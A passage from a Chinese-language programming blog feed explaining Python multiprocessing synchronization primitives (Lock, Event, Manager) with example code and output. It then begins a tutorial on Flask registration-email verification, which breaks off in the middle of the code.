时,将不会阻塞,如果此时锁被其他进程或线程持有,当前进程或线程获取锁操作失败,锁的递归等级也不会改变,函数返回<code>False</code>,如果锁已经处于释放状态,那么当前进程或线程会拿到锁,并且锁类的递归等级加一,函数返回<code>True</code></li><li><code>release()</code>:释放锁,使锁内的递归等级减一,如果释放后锁内部的递归等级为0,则会重置锁的状态为释放状态(即没有被任何进程或线程持有).如果释放后锁内部的递归等级不为0,则这个锁仍然保持未释放状态,并且当前进程或线程就是持有者.只有当前进程或线程是锁的持有者,才运行调用这个方法.否则会抛出<code>AssertionError</code>异常</li></ul></li><li><p><code>Event</code>:这是最简单的通信机制之一:一个进程或线程发送事件信号,而其他进程或线程等待信号,一个事件对象管理一个内部标志,调用<code>set()</code>方法可以将其设置为<code>True</code>,调用<code>clear()</code>方法可以将其设置为<code>False</code>,调用<code>wait()</code>方法进进入阻塞直到标志为<code>True</code>,初始为<code>Flase</code></p><ul><li><code>is_set()</code>:当且仅当内部标志为<code>True</code>时返回<code>True</code></li><li><code>set()</code>:将内部标志设置为<code>True</code>,</li><li><code>clear()</code>:将内部标志设置为<code>False</code></li><li><code>wait(timeout=None)</code>:阻塞进程或线程直到内部标志为<code>True</code>或者发生可选的超时.</li></ul></li><li><p><code>condition</code>:此对象用来同步部分工作流程,在并行的进程中,有两个基本的方法: <code>wait()</code> 用来等待进程, <code>notify_all()</code> 用来通知所有等待此条件的进程.</p></li><li><p><code>Semaphore</code>:用来共享资源,例如,支持固定数量的共享连接.</p></li><li><p><code>Barrier</code>:将程序分成几个阶段,适用于有些进程必须在某些特定进程之后执行.处于障碍(Barrier)之后的代码不能同处于障碍之前的代码并行.</p></li></ul></blockquote><h3 id="1-进程锁"><a href="#1-进程锁" class="headerlink" title="1.进程锁"></a>1.进程锁</h3><blockquote><p>需要注意的是,对于线程来说,线程是共享内存的,共享主线程中的全局变量的.</p><p>而对于进程来说,每个进程是分开独立的,共享的资源可以来自文件,可以来自队列中,可以来自内存中,多进程有很多共享资源的方法,应该尽量避免使用锁,而使用<code>Queue</code> 和<code>Pipe</code>,他们更有效率,占用资源更小.</p><ul><li>共享资源来自内存: 应该尽量避免这种情况,查看<a href="./10058.md">共享内存</a></li><li>资源来自文件:操作外部文件.</li></ul><p>操作文件实例:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""进程锁的用法和线程锁的用法相似:线程是共享内存,共享主线程中的全局变量的.而对于进程来讲,他们是分开独立的,共享的资源可以来自文件,可以来自队列中多进程有很多共享资源的方法,应该尽量避免加锁"""</span><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">worker_with</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 上下文管理器,是可以简写的</span> <span class="token comment" spellcheck="true"># 等同于加锁</span> <span class="token keyword">with</span> lock<span class="token punctuation">,</span> open<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fs<span class="token punctuation">:</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         fs<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'locked acquired via with: \n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker_no_with</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span> lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">try</span><span class="token punctuation">:</span>     <span class="token keyword">with</span> open<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fs<span class="token punctuation">:</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             fs<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Lock acquired  directory\n"</span><span class="token punctuation">)</span> <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>     <span class="token keyword">pass</span> <span class="token keyword">finally</span><span class="token punctuation">:</span>     lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> lock <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span> f <span class="token operator">=</span> <span class="token string">'file.txt'</span> w <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker_with<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">)</span> nw <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker_no_with<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">)</span> w<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> nw<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在多线程中，我们可以比较容易地共享资源，比如使用全局变量或者传递参数。在多进程情况下，由于每个进程有自己独立的内存空间，以上方法并不合适。此时我们可以通过共享内存和Manager的方法来共享资源。但这样做提高了程序的复杂度，并因为同步的需要而降低了程序的效率。</p></blockquote><h3 id="2-Event"><a href="#2-Event" class="headerlink" title="2.Event"></a>2.<code>Event</code></h3><blockquote><p>Event 用来实现进程间的同步通信,类似与线程,同样是要发送一个标志位的信号</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token triple-quoted-string string">"""Event进程之间通信"""</span><span class="token keyword">def</span> <span class="token function">wait_for_event</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wait_for_event starting'</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># wait会阻塞进程,直到 set 方法设置为True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wait_for_event.is_set():{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">wait_for_event_timeout</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wait_for_event_timeout:starting'</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># wait会阻塞进程 t 时间</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wait_for_event_timeout.is_set():{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""主进程"""</span><span class="token comment" spellcheck="true"># 生成event</span>event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成两个进程,一个发送 set() 信息,一个发送 超时时间</span>proc1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>wait_for_event<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>proc2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>wait_for_event_timeout<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>proc1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># proc1.join()</span>proc2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># proc2.join()</span><span class="token comment" spellcheck="true"># 主进程发送信号,并且主进程休息3秒,让proc2的timeout过期</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash"><code class="language-bash">wait_for_event startingwait_for_event_timeout:startingwait_for_event_timeout.is_set<span class="token punctuation">(</span><span class="token punctuation">)</span>:Falsewait_for_event.is_set<span class="token punctuation">(</span><span class="token punctuation">)</span>:True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-Manager"><a href="#3-Manager" class="headerlink" title="3.Manager"></a>3.<code>Manager</code></h3><blockquote><p>Python的多进程模块提供了在所有的用户间管理共享信息的管理者<code>Manager</code>,该进程保存Python对象并允许其他进程使用代理操作他们.</p><p><code>Manager</code> 有一下特性:</p><ul><li>它控制管理共享对象的服务进程</li><li>它确保当某一个进程修改了共享对象之后,所有的进程都能拿到更新的共享对象</li></ul><p><code>Manager()</code> 返回的管理器支持类型:<code>list\dict\namespace\lock\rlock\semaphore\boundedsemaphore</code></p><p><code>\condition\event\barrier\Queue\Value\Array</code></p><p><code>Manger()</code> 也支持上下文管理器.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Process<span class="token punctuation">,</span>Manager<span class="token punctuation">,</span>current_process<span class="token comment" spellcheck="true"># 在子进程中修改数据</span><span class="token keyword">def</span> <span class="token function">worker1</span><span class="token punctuation">(</span>ob_dict<span class="token punctuation">,</span> ob_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 开始 执行'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ob_dict<span class="token punctuation">[</span>item<span class="token punctuation">]</span> <span class="token operator">=</span> item    ob_list<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ob_list<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 完毕'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 在子进程中修改数据</span><span class="token keyword">def</span> <span class="token function">worker2</span><span class="token punctuation">(</span>ob_dict<span class="token punctuation">,</span> ob_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 开始 执行'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ob_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> ob_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key:{}, value:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 完毕'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    <span class="token comment" spellcheck="true"># 创建manager</span>    manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span><span class="token punctuation">)</span>    manager_dict <span class="token operator">=</span> manager<span class="token punctuation">.</span>dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    manager_list <span class="token operator">=</span> manager<span class="token punctuation">.</span>list<span class="token punctuation">(</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    proc1 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    proc2 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    proc1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果</p><pre class="line-numbers language-bash"><code class="language-bash">子进程:Process-2 开始 执行<span class="token punctuation">[</span>2, 1, 0<span class="token punctuation">]</span>子进程:Process-2 完毕子进程:Process-3 开始 执行key:0, value:0key:1, value:1key:2, value:2key:3, value:3key:4, value:4子进程:Process-3 完毕<span class="token punctuation">{</span>0: 0, 1: 1, 2: 2, 3: 3, 4: 4<span class="token punctuation">}</span> <span class="token punctuation">[</span>2, 1, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意,<code>Manager()</code> 也支持上下文管理,也可以写成</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    <span class="token comment" spellcheck="true"># 创建manager</span>    <span class="token keyword">with</span> Manager<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> manager<span class="token punctuation">:</span>        manager_dict <span class="token operator">=</span> manager<span class="token punctuation">.</span>dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        manager_list <span class="token operator">=</span> manager<span class="token punctuation">.</span>list<span class="token punctuation">(</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        proc1 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>        proc2 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>        proc1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        proc1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        proc2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        proc2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假如不使用<code>Manager()</code> 如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span>  Process<span class="token punctuation">,</span>current_process<span class="token comment" spellcheck="true"># 在子进程中修改数据</span><span class="token keyword">def</span> <span class="token function">worker1</span><span class="token punctuation">(</span>ob_dict<span class="token punctuation">,</span> ob_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 开始 执行'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ob_dict<span class="token punctuation">[</span>item<span class="token punctuation">]</span> <span class="token operator">=</span> item    <span class="token keyword">print</span><span class="token punctuation">(</span>ob_dict<span class="token punctuation">)</span>    ob_list<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ob_list<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 在子进程中修改数据</span><span class="token keyword">def</span> <span class="token function">worker2</span><span class="token punctuation">(</span>ob_dict<span class="token punctuation">,</span> ob_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{} 开始 执行'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ob_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> ob_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key:{}, value:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    manager_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    manager_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>    proc1 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    proc2 <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    proc1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    proc2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>manager_dict<span class="token punctuation">,</span> manager_list<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><pre class="line-numbers language-bash"><code class="language-bash">子进程:Process-1 开始 执行<span class="token punctuation">{</span>0: 0, 1: 1, 2: 2, 3: 3, 4: 4<span class="token punctuation">}</span><span class="token punctuation">[</span>3, 2, 1<span class="token punctuation">]</span>子进程:Process-2 开始 执行<span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">[</span>1, 2, 3<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到各个进程之间是隔离的,不会操作各自的变量.</p><p>当然,可以使用共享内存的方法<code>Value\Array</code> 来处理共同的数据.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask邮箱验证</title>
      <link href="/posts/55600.html"/>
      <url>/posts/55600.html</url>
      
        <content type="html"><![CDATA[<h2 id="Flask发送注册邮件"><a href="#Flask发送注册邮件" class="headerlink" title="Flask发送注册邮件"></a>Flask发送注册邮件</h2><h3 id="1-导读"><a href="#1-导读" class="headerlink" title="1.导读"></a>1.导读</h3><blockquote><p>前面已经简单的学习了<a href="https://wenyan.online/2020/10/19/flask-shang-xia-wen/" target="_blank" rel="noopener">Flask上下文</a>,以及<a href="https://wenyan.online/2020/10/23/flask-qi-dong-liu-cheng/" target="_blank" rel="noopener">Flask启动流程</a>,现在结合<a href="https://wenyan.online/2020/10/21/flaskmail/" target="_blank" rel="noopener">Flask Mail</a>,(还有Python相关线程进程的操作).结合这些,简单的实现一下<code>Flask</code>注册邮箱,并发送验证邮件.类似如下:</p><pre class="mermaid">>   graph LR;  A(登录页面)-->B(发送验证邮件)-->C(邮箱中验证)</pre></blockquote><h3 id="2-搭建基本架构"><a href="#2-搭建基本架构" class="headerlink" title="2.搭建基本架构"></a>2.搭建基本架构</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash">❯ tree<span class="token keyword">.</span>├── app.py         <span class="token comment" spellcheck="true"># 主app</span>├── bpModel    <span class="token comment" spellcheck="true">#  Python包文件,主要存放蓝图模板</span>│   ├── __init__.py│   └── users.py   <span class="token comment" spellcheck="true"># 主路由文件</span>├── config.py     <span class="token comment" spellcheck="true"># 主配置文件</span>├── exts.py          <span class="token comment" spellcheck="true"># 解决双向引入的问题</span>├── formModel.py    <span class="token comment" spellcheck="true"># form模板</span>├── mailModel.py      <span class="token comment" spellcheck="true"># 发送邮件模板</span>├── manager.py          <span class="token comment" spellcheck="true"># 主要基本管理</span>├── migrations            <span class="token comment" spellcheck="true"># 数据库版本迁移文件</span>│   ├── alembic.ini│   ├── env.py│   ├── README│   ├── script.py.mako│   └── versions│       ├── c15ed05a9a50_.py├── sqlModel.py        <span class="token comment" spellcheck="true"># 数据库模板</span>├── static                   <span class="token comment" spellcheck="true"># 静态文件CSS/JS/Image目录</span>└── templates           <span class="token comment" spellcheck="true"># 静态模板</span>    ├── activate.html      <span class="token comment" spellcheck="true"># 激活</span>    ├── login.html             <span class="token comment" spellcheck="true"># 登录</span>    ├── register.html          <span class="token comment" spellcheck="true"># 注册</span>    └── verification.html     <span class="token comment" spellcheck="true"># 注册后返回的页面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下,从开头的思路出发,一步一步实现.</p></blockquote><h4 id="1-app-py"><a href="#1-app-py" class="headerlink" title="1.app.py"></a>1.<code>app.py</code></h4><blockquote><p>主<code>app</code>文件中,我们应该尽量减少路由,把核心的路由全部布置在<code>bpModel</code>中</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> bpModel <span class="token keyword">import</span> usersapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 测试路由</span>    <span class="token keyword">return</span>  <span class="token string">'index page'</span><span class="token comment" spellcheck="true"># 注册blueprint</span>app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>users<span class="token punctuation">.</span>bp<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置文件<code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python">DEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>蓝图文件<code>bpModel/users.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span>  Blueprint<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> current_appbp <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">,</span> 